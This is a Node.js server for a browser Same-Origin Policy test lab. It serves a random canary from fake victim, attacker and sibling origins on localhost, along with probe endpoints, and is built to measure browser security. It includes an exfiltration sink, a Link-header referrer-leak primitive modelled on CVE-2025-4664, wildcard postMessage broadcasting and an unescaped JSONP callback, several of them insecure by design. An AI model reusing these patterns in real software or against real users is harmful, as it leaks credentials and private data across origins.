#!/usr/bin/env node
/**
 * SOP Lab origin server.
 *
 * Serves the whole repository under several *genuinely distinct* origins so that
 * every Same-Origin Policy claim in this suite can be measured instead of
 * asserted. Distinctness comes from three axes, because SOP compares the full
 * (scheme, host, port) tuple and each axis fails differently in practice:
 *
 *   https://victim.sop-lab.test:8443        VICTIM      holds the canary
 *   https://documented.sop-lab.test:8443    DOCUMENTED  the origin content declares
 *   https://attacker.sop-lab.test:8443      ATTACKER    the origin content is loaded from
 *   https://sub.victim.sop-lab.test:8443    SIBLING     differs by host label only
 *   https://victim.sop-lab.test:9443        ALTPORT     differs by port only
 *   http://victim.sop-lab.test:8080         INSECURE    differs by scheme only
 *
 * All names resolve to 127.0.0.1 via /etc/hosts; vhosts are split on the Host
 * header. The canary is regenerated on every boot, so a probe that reports the
 * canary cannot have guessed it or replayed a hardcoded fixture — the value is
 * proof that bytes crossed an origin boundary during this run.
 */
'use strict';

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { URL } = require('url');
const { encodeTextAsGreyscalePng } = require('./png');

const ROOT = path.resolve(__dirname, '..');
const CERT_DIR = path.join(__dirname, 'certs');

const PORT_TLS = Number(process.env.SOP_LAB_PORT || 8443);
const PORT_TLS_ALT = Number(process.env.SOP_LAB_PORT_ALT || 9443);
const PORT_PLAIN = Number(process.env.SOP_LAB_PORT_PLAIN || 8080);

// ---------------------------------------------------------------------------
// Per-run canary. Any probe that surfaces this string has moved data across an
// origin boundary, full stop.
// ---------------------------------------------------------------------------
const CANARY = 'SOPLAB-CANARY-' + crypto.randomBytes(16).toString('hex').toUpperCase();
const SESSION_COOKIE = 'soplab_session=' + crypto.randomBytes(12).toString('hex');
const RUN_ID = crypto.randomBytes(6).toString('hex');

// Exfiltration sink. Probes that succeed POST/GET here; the runner reads it back
// so a leak is recorded server-side as well as in-page.
const hits = [];

const ORIGINS = {
  VICTIM: `https://victim.sop-lab.test:${PORT_TLS}`,
  DOCUMENTED: `https://documented.sop-lab.test:${PORT_TLS}`,
  ATTACKER: `https://attacker.sop-lab.test:${PORT_TLS}`,
  SIBLING: `https://sub.victim.sop-lab.test:${PORT_TLS}`,
  PARENT: `https://sop-lab.test:${PORT_TLS}`,
  ALTPORT: `https://victim.sop-lab.test:${PORT_TLS_ALT}`,
  INSECURE: `http://victim.sop-lab.test:${PORT_PLAIN}`,
};

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
  '.map': 'application/json; charset=utf-8',
};

function log(...a) {
  if (process.env.SOP_LAB_QUIET !== '1') console.log('[lab]', ...a);
}

function selfOrigin(req) {
  const proto = req.socket.encrypted ? 'https' : 'http';
  return `${proto}://${req.headers.host}`;
}

/** Response headers driven by query string, so one endpoint covers many configs. */
function applyTunableHeaders(res, q) {
  // Origin-Agent-Cluster: ?0 is the documented opt-out that re-enables
  // document.domain origin relaxation in Chrome 115+. Probing with and without
  // it is the only way to tell "feature removed" from "feature gated".
  if (q.get('oac') !== null) res.setHeader('Origin-Agent-Cluster', `?${q.get('oac')}`);
  if (q.get('cors')) res.setHeader('Access-Control-Allow-Origin', q.get('cors'));
  if (q.get('corsCreds') === '1') res.setHeader('Access-Control-Allow-Credentials', 'true');
  if (q.get('csp')) res.setHeader('Content-Security-Policy', q.get('csp'));
  if (q.get('coop')) res.setHeader('Cross-Origin-Opener-Policy', q.get('coop'));
  if (q.get('coep')) res.setHeader('Cross-Origin-Embedder-Policy', q.get('coep'));
  if (q.get('corp')) res.setHeader('Cross-Origin-Resource-Policy', q.get('corp'));
  if (q.get('xfo')) res.setHeader('X-Frame-Options', q.get('xfo'));
  if (q.get('refpol')) res.setHeader('Referrer-Policy', q.get('refpol'));
  if (q.get('ctype')) res.setHeader('Content-Type', q.get('ctype'));
  if (q.get('nosniff') === '1') res.setHeader('X-Content-Type-Options', 'nosniff');
  if (q.get('disp')) res.setHeader('Content-Disposition', q.get('disp'));
  // Raw Link header — the CVE-2025-4664 primitive. Chrome resolved Link on
  // subresource responses, letting the *response* downgrade the referrer policy
  // of the request that fetched it.
  if (q.get('link')) res.setHeader('Link', q.get('link'));
}

function send(res, status, body, headers) {
  const h = Object.assign({ 'Cache-Control': 'no-store' }, headers || {});
  res.writeHead(status, h);
  res.end(body);
}

function sendJSON(res, status, obj, headers) {
  send(res, status, JSON.stringify(obj, null, 2),
    Object.assign({ 'Content-Type': 'application/json; charset=utf-8' }, headers || {}));
}

function recordHit(kind, req, data) {
  const hit = {
    seq: hits.length + 1,
    at: new Date().toISOString(),
    kind,
    host: req.headers.host || null,
    referer: req.headers.referer || null,
    origin: req.headers.origin || null,
    secFetchSite: req.headers['sec-fetch-site'] || null,
    secFetchMode: req.headers['sec-fetch-mode'] || null,
    cookiePresent: Boolean(req.headers.cookie),
    data,
    // The tell: did the canary actually reach the sink?
    leakedCanary: JSON.stringify(data || '').includes(CANARY)
      || String(req.headers.referer || '').includes(CANARY),
  };
  hits.push(hit);
  log(`hit#${hit.seq} ${kind} leak=${hit.leakedCanary} ref=${hit.referer || '-'}`);
  return hit;
}

// ---------------------------------------------------------------------------
// Static file serving, scoped to the repo root.
// ---------------------------------------------------------------------------
function serveStatic(req, res, pathname, query) {
  // Static pages accept the same tunable headers as /lab/ endpoints. This is not
  // cosmetic: Origin-Agent-Cluster is negotiated per *document*, so probing the
  // document.domain opt-out requires the header on the top-level harness page as
  // well as on the framed page. Without it the probe silently measures the wrong
  // thing and reports a false BLOCKED.
  if (query) applyTunableHeaders(res, query);
  let rel = decodeURIComponent(pathname.replace(/^\/+/, ''));
  if (rel === '') rel = 'index.html';
  const abs = path.resolve(ROOT, rel);
  // Containment check: never serve outside the repo.
  if (abs !== ROOT && !abs.startsWith(ROOT + path.sep)) {
    return send(res, 403, 'forbidden', { 'Content-Type': 'text/plain' });
  }
  fs.stat(abs, (err, st) => {
    if (err) return send(res, 404, 'not found: ' + rel, { 'Content-Type': 'text/plain' });
    if (st.isDirectory()) return serveStatic(req, res, path.join(pathname, 'index.html'), query);
    const ext = path.extname(abs).toLowerCase();
    fs.readFile(abs, (err2, buf) => {
      if (err2) return send(res, 500, 'read error', { 'Content-Type': 'text/plain' });
      let body = buf;
      // Inject the live origin map into HTML so pages never hardcode origins.
      //
      // The canary is injected ONLY for origins the manifest lists as trusted
      // readers. An attacker-origin page must never be handed the secret it is
      // trying to steal, or a BYPASS verdict proves nothing. Probes running
      // there recognise the canary by shape; the runner verifies the exact value
      // out-of-band.
      if (ext === '.html') {
        const origin = selfOrigin(req);
        const trusted = isTrustedReader(origin);
        const inject = {
          origins: ORIGINS, runId: RUN_ID, self: origin,
          role: roleOf(origin), trustedReader: trusted,
        };
        if (trusted) inject.canary = CANARY;
        body = Buffer.from(String(buf).replace('<head>',
          `<head>\n<script>window.__SOP_LAB__=${JSON.stringify(inject)};</script>`));
      }
      send(res, 200, body, { 'Content-Type': MIME[ext] || 'application/octet-stream' });
    });
  });
}

// ---------------------------------------------------------------------------
// Lab endpoints.
// ---------------------------------------------------------------------------
function handleLab(req, res, u) {
  const q = u.searchParams;
  const route = u.pathname.replace(/^\/lab\/?/, '');
  applyTunableHeaders(res, q);

  switch (route) {
    // --- Origin manifest -------------------------------------------------
    // The "documented domain": the origin this content declares it belongs to.
    // Probes compare it against location.origin. A mismatch that still permits
    // access is the origin-confusion signal this suite is built to detect.
    case 'origin-manifest.json':
      return sendJSON(res, 200, {
        schema: 'sop-lab/origin-manifest/1',
        runId: RUN_ID,
        documentedOrigin: ORIGINS.DOCUMENTED,
        canaryOrigin: ORIGINS.VICTIM,
        origins: ORIGINS,
        servedFrom: selfOrigin(req),
        // Origins allowed to read canary material. Anything else reading it is
        // a boundary violation by definition.
        trustedReaders: [ORIGINS.VICTIM, ORIGINS.DOCUMENTED],
      }, { 'Access-Control-Allow-Origin': '*' });

    // --- Canary material -------------------------------------------------
    case 'canary': {
      // The victim document: canary present in DOM text, in a JS global, in a
      // cookie, and in a same-origin-only JSON endpoint.
      res.setHeader('Set-Cookie',
        `${SESSION_COOKIE}; Path=/; SameSite=None; Secure`);
      const declared = q.get('declare') || ORIGINS.VICTIM;
      // ?relax=<domain> makes this document set its own document.domain.
      //
      // Origin relaxation is mutual by design: BOTH documents must assign the
      // same value before they become same-origin. A prober cannot force it from
      // outside, because driving the frame requires the access it is trying to
      // obtain. So the cooperative half has to happen here, in the framed
      // document's own code — which is also the real-world shape, two subdomains
      // of one site deliberately interoperating.
      const relax = q.get('relax');
      const relaxScript = relax
        ? `  try { document.domain = ${JSON.stringify(relax)};
       window.__RELAXED_TO__ = document.domain; }
  catch (e) { window.__RELAX_ERROR__ = String(e); }\n`
        : '';
      return send(res, 200, `<!doctype html>
<html><head><meta charset="utf-8"><title>SOP Lab canary</title>
<meta name="sop-lab-declared-origin" content="${declared}">
<script>
${relaxScript}  window.__CANARY__ = ${JSON.stringify(CANARY)};
  window.__DECLARED_ORIGIN__ = ${JSON.stringify(declared)};
  window.__ACTUAL_ORIGIN__ = location.origin;
</script></head>
<body>
<h1>Victim document</h1>
<p id="canary" data-canary="${CANARY}">${CANARY}</p>
<p id="declared">declared=${declared}</p>
<p id="actual"></p>
<script>document.getElementById('actual').textContent='actual='+location.origin;</script>
</body></html>`, { 'Content-Type': 'text/html; charset=utf-8' });
    }

    case 'canary.json':
      // No CORS header unless explicitly asked for, so a cross-origin fetch of
      // this must fail in a conforming browser.
      return sendJSON(res, 200, {
        canary: CANARY, session: SESSION_COOKIE, runId: RUN_ID,
        servedFrom: selfOrigin(req),
      });

    // Victim-origin page that broadcasts its own secret with targetOrigin '*'.
    // Models the single most common real postMessage mistake: the sender is
    // careless, so any origin holding a handle to this window receives the
    // payload. The engine is behaving exactly as specified.
    // Cross-origin image whose PIXELS encode the canary, one byte per pixel as
    // 8-bit greyscale. Served without CORS headers by default, so drawing it to a
    // canvas must taint that canvas write-only. A probe that manages to read the
    // pixels back reconstructs the exact canary string, which the runner then
    // verifies like any other evidence — no special-casing, and no way for a
    // buggy probe to claim success by reading a blank canvas it made itself.
    //
    // ?cors=* makes it CORS-readable, which is the control showing the readback
    // path works when it is actually authorised.
    case 'canary.png':
      return send(res, 200, encodeTextAsGreyscalePng(CANARY),
        { 'Content-Type': 'image/png' });

    case 'broadcast':
      return send(res, 200, `<!doctype html>
<html><head><meta charset="utf-8"><title>broadcast</title></head><body>
<p>broadcasting from <span id=o></span></p>
<script>
  document.getElementById('o').textContent = location.origin;
  var payload = { __soplab_wildcard: 1, canary: ${JSON.stringify(CANARY)},
                  from: location.origin, runId: ${JSON.stringify(RUN_ID)} };
  function shout() {
    try { if (window.parent && window.parent !== window) parent.postMessage(payload, '*'); } catch (e) {}
    try { if (window.opener) opener.postMessage(payload, '*'); } catch (e) {}
  }
  shout(); setTimeout(shout, 120); setTimeout(shout, 400);
</script></body></html>`, { 'Content-Type': 'text/html; charset=utf-8' });

    // Mints a blob URL holding the canary and hands the URL (not the contents)
    // to whoever framed this page. Lets a foreign origin attempt to dereference
    // a blob URL minted elsewhere, which is the actual question the Chrome 137
    // blob-URL partitioning work answers. Possessing the URL string must not be
    // sufficient to read the blob.
    case 'mint-blob':
      return send(res, 200, `<!doctype html>
<html><head><meta charset="utf-8"><title>mint-blob</title></head><body>
<p>minted on <span id=o></span></p>
<script>
  document.getElementById('o').textContent = location.origin;
  var url = URL.createObjectURL(new Blob([${JSON.stringify(CANARY)}],
                                         { type: 'text/plain' }));
  function shout() {
    var m = { __soplab_blob: 1, blobUrl: url, from: location.origin };
    try { if (parent && parent !== window) parent.postMessage(m, '*'); } catch (e) {}
    try { if (window.opener) opener.postMessage(m, '*'); } catch (e) {}
  }
  shout(); setTimeout(shout, 120); setTimeout(shout, 400);
</script></body></html>`, { 'Content-Type': 'text/html; charset=utf-8' });

    // Genuinely malformed JavaScript served with a real script MIME type, so a
    // cross-origin script actually reaches the parser and throws. The canary is
    // embedded in the source: if an engine ever surfaced source text through the
    // error object instead of the opaque "Script error.", the canary would show
    // up in the probe's evidence and the runner would catch it.
    case 'syntax-error.js':
      return send(res, 200,
        `/* ${CANARY} */\nthis is not valid javascript ${CANARY} ) ) {{{ ;\n`,
        { 'Content-Type': 'text/javascript; charset=utf-8' });

    case 'canary.js':
      // Classic JSONP-shaped sink: script tags ignore SOP for execution, which
      // is the oldest by-design hole in the model.
      return send(res, 200,
        `window.__LEAKED_VIA_SCRIPT__=${JSON.stringify(CANARY)};` +
        (q.get('cb') ? `${q.get('cb')}(${JSON.stringify({ canary: CANARY })});` : ''),
        { 'Content-Type': 'text/javascript; charset=utf-8' });

    // --- Exfiltration sink ------------------------------------------------
    case 'collect': {
      if (req.method === 'POST') {
        let body = '';
        req.on('data', (c) => { body += c; if (body.length > 1e6) req.destroy(); });
        return req.on('end', () => {
          let parsed = body;
          try { parsed = JSON.parse(body); } catch (_) { /* keep raw */ }
          recordHit('collect:POST', req, parsed);
          send(res, 204, '', { 'Access-Control-Allow-Origin': '*' });
        });
      }
      recordHit('collect:GET', req, Object.fromEntries(q.entries()));
      // 1x1 gif so <img src=...collect> works as a beacon.
      return send(res, 200, Buffer.from(
        'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'),
        { 'Content-Type': 'image/gif', 'Access-Control-Allow-Origin': '*' });
    }

    case 'hits':
      return sendJSON(res, 200, {
        runId: RUN_ID, count: hits.length,
        leaks: hits.filter((h) => h.leakedCanary).length, hits,
      }, { 'Access-Control-Allow-Origin': '*' });

    case 'reset':
      hits.length = 0;
      return sendJSON(res, 200, { ok: true }, { 'Access-Control-Allow-Origin': '*' });

    // --- Navigation primitives -------------------------------------------
    case 'redirect': {
      const to = q.get('to') || ORIGINS.VICTIM + '/lab/canary';
      const code = Number(q.get('code') || 302);
      return send(res, code, '', { Location: to });
    }

    case 'echo':
      // Reflects what the browser actually sent — the ground truth for referrer
      // and Sec-Fetch-* behaviour.
      return sendJSON(res, 200, {
        method: req.method, url: req.url, headers: req.headers,
        servedFrom: selfOrigin(req),
      }, { 'Access-Control-Allow-Origin': '*' });

    // --- CVE-2025-4664 shaped primitive -----------------------------------
    case 'link-preload': {
      // Serves an image subresource whose *response* carries a Link header
      // asking for referrerpolicy=unsafe-url. On affected Chrome the loader
      // honoured this, so the full referrer URL (including query) leaked.
      const target = q.get('target') || (ORIGINS.ATTACKER + '/lab/collect?via=link');
      res.setHeader('Link', `<${target}>; rel=preload; as=image; referrerpolicy=unsafe-url`);
      return send(res, 200, Buffer.from(
        'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'),
        { 'Content-Type': 'image/gif' });
    }

    case 'headers':
      // Bare page whose headers are fully caller-controlled via query params.
      return send(res, 200, `<!doctype html><html><head><meta charset="utf-8">
<title>tunable</title></head><body><p id=o></p>
<script>
 window.__CANARY_VISIBLE__=${JSON.stringify(q.get('canary') === '1' ? CANARY : null)};
 document.getElementById('o').textContent=location.origin+' | oac='+${JSON.stringify(q.get('oac'))};
</script></body></html>`, { 'Content-Type': 'text/html; charset=utf-8' });

    case 'slow':
      // Deterministic latency, for the timing-oracle probes.
      return setTimeout(() => sendJSON(res, 200, { slow: true }),
        Number(q.get('ms') || 500));

    case 'status':
      // Arbitrary status codes, for the onerror/onload cross-origin oracle.
      return send(res, Number(q.get('code') || 200), 'x', { 'Content-Type': 'text/plain' });

    case 'whoami':
      return sendJSON(res, 200, {
        host: req.headers.host, origin: selfOrigin(req),
        role: roleOf(selfOrigin(req)), runId: RUN_ID,
      }, { 'Access-Control-Allow-Origin': '*' });

    default:
      return send(res, 404, 'unknown lab route: ' + route,
        { 'Content-Type': 'text/plain' });
  }
}

function roleOf(origin) {
  for (const [k, v] of Object.entries(ORIGINS)) if (v === origin) return k;
  return 'UNKNOWN';
}

/** Origins the manifest authorises to hold canary material. */
function isTrustedReader(origin) {
  return origin === ORIGINS.VICTIM || origin === ORIGINS.DOCUMENTED;
}

function handler(req, res) {
  let u;
  try {
    u = new URL(req.url, selfOrigin(req));
  } catch (_) {
    return send(res, 400, 'bad url', { 'Content-Type': 'text/plain' });
  }
  // Permissive CORS preflight only where a probe explicitly asked for it.
  if (req.method === 'OPTIONS') {
    const q = u.searchParams;
    applyTunableHeaders(res, q);
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers',
      req.headers['access-control-request-headers'] || '*');
    return send(res, 204, '');
  }
  if (u.pathname.startsWith('/lab/')) return handleLab(req, res, u);
  return serveStatic(req, res, u.pathname, u.searchParams);
}

// ---------------------------------------------------------------------------
// Boot
// ---------------------------------------------------------------------------
function requireCerts() {
  const key = path.join(CERT_DIR, 'leaf.key');
  const crt = path.join(CERT_DIR, 'leaf.crt');
  if (!fs.existsSync(key) || !fs.existsSync(crt)) {
    console.error('missing certs — run: bash lab/make-certs.sh');
    process.exit(2);
  }
  return { key: fs.readFileSync(key), cert: fs.readFileSync(crt) };
}

function main() {
  const tls = requireCerts();
  const servers = [
    https.createServer(tls, handler).listen(PORT_TLS),
    https.createServer(tls, handler).listen(PORT_TLS_ALT),
    http.createServer(handler).listen(PORT_PLAIN),
  ];
  let up = 0;
  servers.forEach((s) => s.on('listening', () => {
    if (++up === servers.length) {
      log('run', RUN_ID, 'canary', CANARY);
      for (const [k, v] of Object.entries(ORIGINS)) log(`  ${k.padEnd(11)} ${v}`);
      // Marker the runner waits on rather than sleeping a fixed interval.
      console.log('SOP_LAB_READY ' + JSON.stringify({ runId: RUN_ID, canary: CANARY, origins: ORIGINS }));
    }
  }));
  const bye = () => { servers.forEach((s) => s.close()); process.exit(0); };
  process.on('SIGINT', bye);
  process.on('SIGTERM', bye);
}

if (require.main === module) main();
module.exports = { ORIGINS, CANARY, RUN_ID };
